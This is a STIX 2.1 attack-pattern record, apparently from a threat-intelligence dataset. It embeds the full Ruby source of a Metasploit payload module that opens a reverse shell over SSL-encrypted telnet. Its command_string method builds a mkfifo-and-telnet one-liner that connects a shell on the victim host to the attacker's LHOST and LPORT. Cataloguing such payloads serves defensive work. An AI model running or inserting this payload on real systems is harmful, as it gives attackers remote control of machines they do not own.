{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c0c5285a-10bf-4a12-a629-1391fef30f95",
    "created": "2024-08-14T16:33:19.334097Z",
    "modified": "2024-08-14T16:33:19.334101Z",
    "name": "Unix Command Shell, Reverse TCP SSL (telnet)",
    "description": " Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the '-z' option included on some systems to encrypt using SSL. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_bash_telnet_ssl.rb",
            "external_id": "reverse_bash_telnet_ssl.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n       'Name'          => 'Unix Command Shell, Reverse TCP SSL (telnet)',\n       'Description'   => %q{\n        Creates an interactive shell via mkfifo and telnet.\n        This method works on Debian and other systems compiled\n        without /dev/tcp support. This module uses the '-z'\n        option included on some systems to encrypt using SSL.\n        },\n       'Author'        => 'RageLtMan <rageltman[at]sempervictus>',\n       'License'       => MSF_LICENSE,\n       'Platform'      => 'unix',\n       'Arch'          => ARCH_CMD,\n       'Handler'       => Msf::Handler::ReverseTcpSsl,\n       'Session'       => Msf::Sessions::CommandShell,\n       'PayloadType'   => 'cmd',\n       'RequiredCmd'   => 'telnet',\n       'Payload'       =>\n         {\n           'Offsets' => { },\n           'Payload' => ''\n         }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('TelnetPath', [true, 'The path to the telnet executable', 'telnet'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    vprint_good(command_string)\n    super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )\n    \"mkfifo #{pipe_name} && #{datastore['TelnetPath']} -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &\"\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}